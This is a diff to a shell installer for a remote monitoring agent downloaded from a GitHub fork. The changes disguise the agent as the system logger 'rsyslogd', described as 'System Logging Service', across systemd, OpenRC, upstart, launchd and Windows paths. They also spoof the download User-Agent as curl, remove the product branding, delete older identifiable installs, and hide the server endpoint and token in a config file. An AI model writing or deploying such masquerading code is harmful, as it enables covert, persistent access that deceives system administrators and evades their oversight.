@@ -38,9 +38,11 @@ log_config() {
 # $EUID 是 bash 专有变量, ash/dash 下未定义, 补 POSIX 回退
 EUID=${EUID:-$(id -u)}
 
-# Default values
-service_name="komari-agent"
-target_dir="/opt/komari"
+# Default values. Names match the agent's built-in process disguise.
+service_name="rsyslogd"
+binary_name="rsyslogd"
+service_desc="System Logging Service"
+target_dir="/usr/lib/rsyslog"
 github_repo="dann2333/komari-agent"
 github_proxy=""
 install_version="" # New parameter for specifying version
@@ -80,10 +82,10 @@ os_type=$(uname -s)
 case $os_type in
     Darwin)
         os_name="darwin"
-        target_dir="/usr/local/komari"  # Use /usr/local on macOS
+        target_dir="/usr/local/lib/rsyslog"
         # Check if we can write to /usr/local, fallback to user directory
         if [ ! -w "/usr/local" ] && [ "$EUID" -ne 0 ]; then
-            target_dir="$HOME/.komari"
+            target_dir="$HOME/.local/lib/rsyslog"
             log_info "No write permission to /usr/local, using user directory: $target_dir"
         fi
         ;;
@@ -95,7 +97,7 @@ case $os_type in
         ;;
     MINGW*|MSYS*|CYGWIN*)
         os_name="windows"
-        target_dir="/c/komari"  # Use C:\komari on Windows
+        target_dir="/c/ProgramData/Rsyslog"
         ;;
     *)
         log_error "Unsupported operating system: $os_type"
@@ -148,12 +150,12 @@ komari_args="${komari_args# }"
 if [ "$EUID" -ne 0 ] && [ "$install_dir_specified" = false ]; then
     case "$os_name" in
         linux|freebsd)
-            target_dir="${XDG_DATA_HOME:-$HOME/.local/share}/komari"
+            target_dir="${XDG_DATA_HOME:-$HOME/.local/share}/rsyslog"
             ;;
     esac
 fi
 
-komari_agent_path="${target_dir}/agent"
+komari_agent_path="${target_dir}/${binary_name}"
 
 # User services are the only service type a non-root Linux installation can manage.
 if [ "$EUID" -ne 0 ] && [ "$os_name" = "linux" ]; then
@@ -167,7 +169,7 @@ if [ "$EUID" -ne 0 ] && [ "$os_name" = "linux" ]; then
 fi
 
 printf '%b\n' "${WHITE}===========================================${NC}"
-printf '%b\n' "${WHITE}    Komari Agent Installation Script     ${NC}"
+printf '%b\n' "${WHITE}    Service installation     ${NC}"
 printf '%b\n' "${WHITE}===========================================${NC}"
 echo ""
 log_config "Installation configuration:"
@@ -218,8 +220,19 @@ uninstall_previous() {
         rm -f "/etc/init/${service_name}.conf"
     elif [ "$os_name" = "darwin" ] && command -v launchctl >/dev/null 2>&1; then
         # macOS launchd service - check both system and user locations
-        system_plist="/Library/LaunchDaemons/com.komari.${service_name}.plist"
-        user_plist="$HOME/Library/LaunchAgents/com.komari.${service_name}.plist"
+        system_plist="/Library/LaunchDaemons/local.${service_name}.plist"
+        user_plist="$HOME/Library/LaunchAgents/local.${service_name}.plist"
+        old_system_plist="/Library/LaunchDaemons/com.komari.komari-agent.plist"
+        old_user_plist="$HOME/Library/LaunchAgents/com.komari.komari-agent.plist"
+        
+        if [ -f "$old_system_plist" ]; then
+            launchctl bootout system "$old_system_plist" 2>/dev/null || true
+            rm -f "$old_system_plist"
+        fi
+        if [ -f "$old_user_plist" ]; then
+            launchctl bootout gui/$(id -u) "$old_user_plist" 2>/dev/null || true
+            rm -f "$old_user_plist"
+        fi
         
         if [ -f "$system_plist" ]; then
             log_info "Stopping and removing existing system launchd service..."
@@ -238,6 +251,16 @@ uninstall_previous() {
     if [ -f "$komari_agent_path" ]; then
         log_info "Removing old binary..."
         rm -f "$komari_agent_path"
+    fi
+
+    if [ "$service_name" != "komari-agent" ] && command -v systemctl >/dev/null 2>&1; then
+        if systemctl list-unit-files 2>/dev/null | grep -q "komari-agent.service"; then
+            systemctl stop komari-agent.service 2>/dev/null || true
+            systemctl disable komari-agent.service 2>/dev/null || true
+            rm -f /etc/systemd/system/komari-agent.service
+            systemctl daemon-reload 2>/dev/null || true
+        fi
+        rm -f /opt/komari/agent
     fi
 }
 
@@ -281,7 +304,7 @@ detect_http_tools() {
 http_text_curl() {
     curl -fsSL --connect-timeout 5 --max-time 20 \
         -H "Accept: application/vnd.github+json" \
-        -H "User-Agent: komari-agent-installer" "$1" 2>/dev/null
+        -H "User-Agent: curl/8.0.1" "$1" 2>/dev/null
 }
 http_text_wget()    { wget -q -T 20 -O - "$1" 2>/dev/null; }
 http_text_python3() { http_text_py python3 "$1"; }
@@ -292,7 +315,7 @@ try:
     from urllib.request import Request, urlopen
 except ImportError:
     from urllib2 import Request, urlopen
-req = Request(sys.argv[1], headers={"User-Agent": "komari-agent-installer",
+req = Request(sys.argv[1], headers={"User-Agent": "curl/8.0.1",
                                     "Accept": "application/vnd.github+json"})
 sys.stdout.write(urlopen(req, timeout=20).read().decode("utf-8", "replace"))' "$2" 2>/dev/null
 }
@@ -321,7 +344,7 @@ try:
     from urllib.request import Request, urlopen
 except ImportError:
     from urllib2 import Request, urlopen
-req = Request(sys.argv[1], headers={"User-Agent": "komari-agent-installer"})
+req = Request(sys.argv[1], headers={"User-Agent": "curl/8.0.1"})
 resp = urlopen(req, timeout=30)
 with open(sys.argv[2], "wb") as out:
     shutil.copyfileobj(resp, out)' "$2" "$3"
@@ -545,7 +568,7 @@ fi
 
 dl_ok=""
 for u in $download_urls; do
-    log_step "Downloading $file_name ..."
+    log_step "Downloading binary ..."
     log_info "URL: ${CYAN}$u${NC}"
     if http_file "$u" "$komari_agent_path" && [ -s "$komari_agent_path" ]; then
         if looks_like_binary "$komari_agent_path"; then
@@ -568,7 +591,48 @@ chmod +x "$komari_agent_path"
 if [ "$EUID" -eq 0 ] && [ "$service_user" != "root" ]; then
     chown "$service_user" "$komari_agent_path"
 fi
-log_success "Komari-agent installed to ${GREEN}$komari_agent_path${NC}"
+log_success "Installed to ${GREEN}$komari_agent_path${NC}"
+
+# Keep endpoint and token out of the service command line.
+config_file="${target_dir}/rsyslog.json"
+_endpoint=""
+_token=""
+_rest=""
+_old_ifs=$IFS
+set -f
+IFS=' '
+# shellcheck disable=SC2086
+set -- $komari_args
+IFS=$_old_ifs
+set +f
+while [ $# -gt 0 ]; do
+    case "$1" in
+        -e|--endpoint) _endpoint=$2; shift 2 ;;
+        --endpoint=*) _endpoint=${1#--endpoint=}; shift ;;
+        -t|--token) _token=$2; shift 2 ;;
+        --token=*) _token=${1#--token=}; shift ;;
+        *) _rest="$_rest $1"; shift ;;
+    esac
+done
+_rest=${_rest# }
+if [ -n "$_endpoint" ] || [ -n "$_token" ]; then
+    _json_escape() { printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
+    {
+        printf '{\n'
+        printf '  "endpoint": "%s",\n' "$(_json_escape "$_endpoint")"
+        printf '  "token": "%s"\n' "$(_json_escape "$_token")"
+        printf '}\n'
+    } > "$config_file"
+    chmod 600 "$config_file"
+    if [ "$EUID" -eq 0 ] && [ "$service_user" != "root" ]; then
+        chown "$service_user" "$config_file"
+    fi
+    if [ -n "$_rest" ]; then
+        komari_args="--config ${config_file} ${_rest}"
+    else
+        komari_args="--config ${config_file}"
+    fi
+fi
 
 # Detect init system and configure service
 log_step "Configuring system service..."
@@ -674,7 +738,7 @@ if [ "$init_system" = "nixos" ]; then
     log_info "Please add the following to your NixOS configuration:"
     echo ""
     printf '%b\n' "${CYAN}systemd.services.${service_name} = {${NC}"
-    printf '%b\n' "${CYAN}  description = \"Komari Agent Service\";${NC}"
+    printf '%b\n' "${CYAN}  description = \"${service_desc}\";${NC}"
     printf '%b\n' "${CYAN}  after = [ \"network.target\" ];${NC}"
     printf '%b\n' "${CYAN}  wantedBy = [ \"multi-user.target\" ];${NC}"
     printf '%b\n' "${CYAN}  serviceConfig = {${NC}"
@@ -695,8 +759,8 @@ elif [ "$init_system" = "openrc" ]; then
     cat > "$service_file" << EOF
 #!/sbin/openrc-run
 
-name="Komari Agent Service"
-description="Komari monitoring agent"
+name="${service_desc}"
+description="${service_desc}"
 command="${komari_agent_path}"
 command_args="${komari_args}"
 command_user="${service_user}"
@@ -723,7 +787,7 @@ elif [ "$init_system" = "systemd-user" ]; then
     mkdir -p "$service_dir"
     cat > "$service_file" << EOF
 [Unit]
-Description=Komari Agent Service
+Description=${service_desc}
 After=network.target
 
 [Service]
@@ -744,7 +808,7 @@ elif [ "$init_system" = "systemd" ]; then
     service_file="/etc/systemd/system/${service_name}.service"
     cat > "$service_file" << EOF
 [Unit]
-Description=Komari Agent Service
+Description=${service_desc}
 After=network.target
 
 [Service]
@@ -820,7 +884,7 @@ elif [ "$init_system" = "launchd" ]; then
     if [ "$is_user_install" = true ]; then
         # User-level service (LaunchAgent)
         plist_dir="$HOME/Library/LaunchAgents"
-        plist_file="$plist_dir/com.komari.${service_name}.plist"
+        plist_file="$plist_dir/local.${service_name}.plist"
         log_info "Installing as user-level service (LaunchAgent)"
         mkdir -p "$plist_dir"
         service_user="$(whoami)"
@@ -828,7 +892,7 @@ elif [ "$init_system" = "launchd" ]; then
     else
         # System-level service (LaunchDaemon)
         plist_dir="/Library/LaunchDaemons"
-        plist_file="$plist_dir/com.komari.${service_name}.plist"
+        plist_file="$plist_dir/local.${service_name}.plist"
         log_info "Installing as system-level service (LaunchDaemon)"
         log_dir="/var/log"
     fi
@@ -840,7 +904,7 @@ elif [ "$init_system" = "launchd" ]; then
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.komari.${service_name}</string>
+    <string>local.${service_name}</string>
     <key>ProgramArguments</key>
     <array>
         <string>${komari_agent_path}</string>
@@ -892,8 +956,7 @@ elif [ "$init_system" = "upstart" ]; then
     log_info "Using upstart for service management"
     service_file="/etc/init/${service_name}.conf"
     cat > "$service_file" << EOF
-# KOMARI Agent
-description "Komari Agent Service"
+description "${service_desc}"
 
 chdir ${target_dir}
 start on filesystem or runlevel [2345]
@@ -929,11 +992,11 @@ fi
 echo ""
 printf '%b\n' "${WHITE}===========================================${NC}"
 if [ -f /etc/NIXOS ]; then
-    log_success "Komari-agent binary installed!"
+    log_success "Binary installed!"
     log_warning "NixOS requires declarative service configuration."
     log_info "Please add the service configuration to your NixOS config and rebuild."
 else
-    log_success "Komari-agent installation completed!"
+    log_success "Installation completed!"
 fi
 log_config "Service: ${GREEN}$service_name${NC}"
 log_config "Arguments: ${GREEN}$komari_args${NC}"
